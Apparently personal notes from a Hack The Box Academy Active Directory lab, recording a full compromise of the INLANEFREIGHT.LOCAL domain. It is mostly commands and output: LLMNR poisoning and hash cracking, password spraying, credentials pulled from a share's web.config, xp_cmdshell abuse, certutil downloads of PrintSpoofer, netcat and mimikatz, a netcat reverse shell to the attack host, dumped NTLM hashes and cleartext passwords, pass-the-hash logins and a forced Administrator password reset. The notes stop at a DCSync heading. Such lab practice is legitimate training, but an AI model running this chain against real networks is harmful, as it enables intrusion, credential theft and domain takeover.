htb-student/HTB_@cademy_stdnt!   172.16.7.240

ssh htb-student@10.129.124.41

ssh -D 9050 htb-student@10.129.124.41
proxychains remmina

```
sudo responder -I ens224 -A # nope
sudo responder -I ens224 -v # working
```
[*] [LLMNR]  Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT
[SMB] NTLMv2-SSP Client   : 172.16.7.3
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\AB920
[SMB] NTLMv2-SSP Hash     : AB920::INLANEFREIGHT:cca800d037d86cf7:259E9B43F3E1D2BE8539EA20CD0419EE:010100000000000000742012449AD801B55B5F1D1476A50100000000020008004F005A004900440001001E00570049004E002D004B003700330033004C003000450057004C005400420004003400570049004E002D004B003700330033004C003000450057004C00540042002E004F005A00490044002E004C004F00430041004C00030014004F005A00490044002E004C004F00430041004C00050014004F005A00490044002E004C004F00430041004C000700080000742012449AD80106000400020000000800300030000000000000000000000000200000000247FD5915B585F963C0FABAAE18967B64A07082EFD7BDB58635C2D4064C430A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000

```
hashcat -m 5600 AB920.txt /usr/share/wordlists/rockyou.txt # weasal
```

### Ping sweep
```
fping -asgq 172.16.7.0/23
```
* 172.16.7.3                  # DC
* 172.16.7.50                 # MS01
* 172.16.7.60                 # SQL01
* 172.16.7.240                # SSH HOST


### List all shares and enum like nmap
```
smbmap -H 172.16.7.3        #  [ ] IP: 172.16.7.3:445	Name: inlanefreight.local
smbmap -H 172.16.7.50       #  [!] Authentication error on 172.16.7.50   Discovered open port 445/tcp 139/tcp 135/tcp 3389/tcp on 172.16.7.50
smbmap -H 172.16.7.60       #  [!] Authentication error on 172.16.7.60
smbmap -H 172.16.7.240      #  [!] 445 not open on 172.16.7.240....     <- Obviously this is your SSH HOST
```

```
smbclient -N -L \\\\IP # ALL FAILED ON smbmap: error: one of the arguments -H --host-file is required
```

### rpcclient to enumerate the password policy in the target
```
rpcclient -U "" -N 172.16.7.3 # working

rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

### Crackmapexec to discover users
```
crackmapexec smb 172.16.7.3 --users

SMB         172.16.7.3      445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
```

```
â””â”€â”€â•¼ $crackmapexec smb 172.16.7.50 --users 
SMB         172.16.7.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
â”Œâ”€[htb-student@skills-par01]â”€[~]
â””â”€â”€â•¼ $crackmapexec smb 172.16.7.60 --users 
SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
```

### Ldapsearch to discover users and filter it
```
ldapsearch -h 172.16.7.3 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

### xfreerdp
```
xfreerdp /u:AB920@inlanefreight.local /p:weasal /v:172.16.7.50  # MS01 Not working as didn't try with proxychain
```

### evil-winrm
```
evil-winrm -i 172.16.7.50 -u AB920 -p weasal  # weasal
```

### Get back to the ssh host to do the Password spraying again
```
sudo crackmapexec smb --local-auth 172.16.7.0/24 -u AB920 -p weasal
sudo crackmapexec smb --local-auth 172.16.7.0/24 -u AB920 -p weasal --pass-pol # --local-auth to ensure only one login attempt. Too caustions, not working!
sudo crackmapexec smb 172.16.7.0/24 -u AB920 -p weasal --pass-pol
```

### Finally found a wayout. get rid of --local-auth
##### 1. Making a Target User List from HTB academy Password Spraying session
```
sudo crackmapexec smb 172.16.7.3 --users -u AB920 -p weasal > user.txt
or 
rpcclient -U "AB920" 172.16.7.3
$ enumdomusers
```

filter it to a valid one
```
cat user.txt | awk '{ print $5 }' | cut -d '\' -f2 > valid_users.txt
```

##### 2. Internal Password Spraying - from Linux
oneline bash
```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.7.3 | grep Authority; done
```

kerbrute is SO FAST!!!
```
kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt  Welcome1

â””â”€â”€â•¼ $kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 valid_users.txt  Welcome1

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 07/18/22 - Ronnie Flathers @ropnop

2022/07/18 19:38:03 >  Using KDC(s):
2022/07/18 19:38:03 >  	172.16.7.3:88

2022/07/18 19:38:31 >  [ ] VALID LOGIN:	 BR086@inlanefreight.local:Welcome1
```

##### 3. CrackMapExec to validate the credentials again the DC
```
sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1
```

### Login to see what we can have
```
xfreerdp /u:BR086@inlanefreight.local /p:Welcome1 /v:172.16.7.50 # Just relezied it's not gonna happen unless setup proxychain first
```

### Credentialed Enumeration - from Linux by following the academy sessions path

```
sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 --loggedon-users
sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 --shares
``` 

```
SMB         172.16.7.3      445    DC01             [ ] Enumerated shares
SMB         172.16.7.3      445    DC01             Share           Permissions     Remark
SMB         172.16.7.3      445    DC01             -----           -----------     ------
SMB         172.16.7.3      445    DC01             ADMIN$                          Remote Admin
SMB         172.16.7.3      445    DC01             C$                              Default share
SMB         172.16.7.3      445    DC01             Department Shares READ            Share for department users
SMB         172.16.7.3      445    DC01             IPC$            READ            Remote IPC
SMB         172.16.7.3      445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.7.3      445    DC01             SYSVOL          READ            Logon server share 
```
```
sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus --share 'Department Shares'
sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus --share 'NETLOGON'
sudo crackmapexec smb 172.16.7.3 -u BR086 -p Welcome1 -M spider_plus --share 'SYSVOL'
```

"Department Shares": { "IT/Private/Development/web.config": ... <- To know where to look into !!

##### SMBMap now

```
smbmap -u BR086 -p Welcome1 -d inlanefreight.local -H 172.16.7.3
smbmap -u BR086 -p Welcome1 -d inlanefreight.local -H 172.16.7.3 -R 'Department Shares' --dir-only
```

```
smbclient //172.16.7.3/Department\ Shares -U=BR086%Welcome1

```
<add name="ConString" connectionString="Environment.GetEnvironmentVariable("computername") '\SQLEXPRESS';Initial Catalog=Northwind;User ID=netdb;Password=D@ta_bAse_adm1n!"/>




### Privileged Access
##### mssqlclient.py
```
mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60 -windows-auth    # not working
mssqlclient.py INLANEFREIGHT/netdb@172.16.7.60                  # working
```

SQL> enable_xp_cmdshell 	Used to enable xp_cmdshell stored procedure that allows for executing OS commands via the database from a Linux-based host.
xp_cmdshell whoami /priv 	Used to enumerate rights on a system using xp_cmdshell.

nt service\mssql$sqlexpress

xp_cmdshell dir c:\Users


### Privilege Escalation on the SQL server with the xp_shell
```
xp_cmdshell certutil -urlcache -f http://172.16.7.240:8000/PrintSpoofer64.exe C:\Users\Public\PrintSpoofer64.exe    # Public is a writeable folder
xp_cmdshell certutil -urlcache -f http://172.16.7.240:8000/nc.exe C:\Users\Public\nc.exe

xp_cmdshell C:\Users\Public\PrintSpoofer64.exe -c "C:\Users\Public\nc.exe 172.16.7.240 1337 -e cmd"
```
on the ssh host `nv -lvnp 1337`

C:\Windows\system32>type C:\Users\Administrator\Desktop\flag.txt
type C:\Users\Administrator\Desktop\flag.txt
s3imp3rs0nate_cl@ssic

### Now everything again!
```
certutil -urlcache -f http://172.16.7.240:8000/mimikatz.exe C:\Users\Public\mimikatz.exe            # also working

certutil -urlcache -split -f http://172.16.7.240:8000/mimikatz.exe C:\Users\Public\mimikatz.exe     # split is a great one
```

##### sekurlsa::LogonPasswords

Authentication Id : 0 ; 211647 (00000000:00033abf)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 7/18/2022 10:16:52 PM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
	msv :	
	 [00000003] Primary
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 8c9555327d95f815987c0d81238c7660
	 * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
	 * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
	tspkg :	
	wdigest :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : Sup3rS3cur3maY5ql$3rverE
	ssp :	
	credman :	
	
### Try the lucky with the creds on MS01
##### Log in
```
xfreerdp /v:172.16.7.50 /u:'inlanefreight.local\mssqlsvc' /p:'Sup3rS3cur3maY5ql$3rverE'  # Awesome!
```

### Alternatively, back to the mimikatz session
https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a

```
privilege::debug
token::elevate
lsadump::sam
sekurlsa::logonPasswords full
```
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 136b3ddfbb62cb02e53a8f661248f364
  
RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 4b4ba140ac0767077aee1958e7f78070
  
[00000003] Primary
	 * Username : SQL01$
	 * Domain   : INLANEFREIGHT
	 * NTLM     : ca3be201cf88ae38662115c44add8976
	 * SHA1     : 051421085a1c181f3dd47342ec8e0555ef0006d9

Secret  : $MACHINE.ACC
cur/hex : f8 87 8c 76 05 3d 59 bc 6b f6 1f e1 21 41 5b 44 8f ce f4 8f 6c aa 0a 24 d8 92 4a 53 2b 45 13 07 49 cb 49 85 b5 f9 ff 6a 36 4b 12 3f 2e 88 2e 88 e4 68 ad db 01 f0 bb 02 bc 4f 1f 40 8b ab 7e 63 67 14 c8 8e b3 60 98 8f 00 46 44 da 06 99 2a 41 5e 9e be fa 7e d8 96 7a 9a d5 5b 20 ca 79 f1 c0 7d 10 cb c1 73 2b fa 02 7d e7 f7 d9 27 86 5d 6e 5d 9e bc cf 3e 0f a5 d7 44 bf 4f b4 32 b4 7e a9 90 00 7a cf 48 a3 ab 1a a1 b1 1c 34 b1 21 a9 7a 26 4a 4d 30 74 4a 8d f8 61 81 49 d7 20 59 b0 33 29 a4 8e 1f 1e 3a 92 44 8f 07 3a 14 8b f5 63 d2 5c f9 60 4c e9 0a da a3 93 14 aa b0 f3 97 d6 e4 c8 28 a1 d5 51 f7 f2 c1 6e 5a 76 4f f7 64 b7 32 a7 ac ca e5 0b a4 a6 39 15 51 5b 28 ef 99 38 ec 67 9b ca 7e 0b 9b 1b 24 ea 2a 48 f4 dd af 89 71 
    NTLM:ca3be201cf88ae38662115c44add8976
    SHA1:051421085a1c181f3dd47342ec8e0555ef0006d9
old/text: ;6bu^ur;mJ&ES&#Iu)CQZeckLZsyN >AgIv4DZ^&EX,Wu.ahRkTÃ)R c&xcu_:]n#V1V.j[= GTjk?l)z OaU8!c^\#`s?8/E!xy^itE>kYiBcSgohVb$P
    NTLM:6991907663e3f68922d24ac9a573e2c3
    SHA1:33058b24d5882f1dd18ce81988aa64226e2879b5


```
evil-winrm -i 172.16.7.60 -u Administrator -H 136b3ddfbb62cb02e53a8f661248f364          <- patched not working anymore
evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99          <- working! Kind of cheating since I got it somewhere else
```

### Could also get those from snaffler and lazagne
```
certutil -urlcache -split -f http://172.16.7.240:8000/Snaffler.exe C:\Users\Public\Snaffler.exe

certutil -urlcache -split -f http://172.16.7.240:8000/lazagne.exe C:\Users\Public\lazagne.exe
```

Administrator:500:aad3b435b51404eeaad3b435b51404ee:136b3ddfbb62cb02e53a8f661248f364:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::

### Now everything start again from MS01 host
Use Inveigh.exe, ps1 and Responder for windows to get the user CT059 # I failed on it


### Cheat again by getting the password somewhere else
evil-winrm -i 172.16.7.3 -u CT059 -p charlie1 <- not working appreantly
proxychains remmina # 3389 is working

### How to Change Windows Password Using Command Line or Powershell
using CT059 since it got GenericALL
```
net user /domain Administrator cft678
```

### DCSync
```
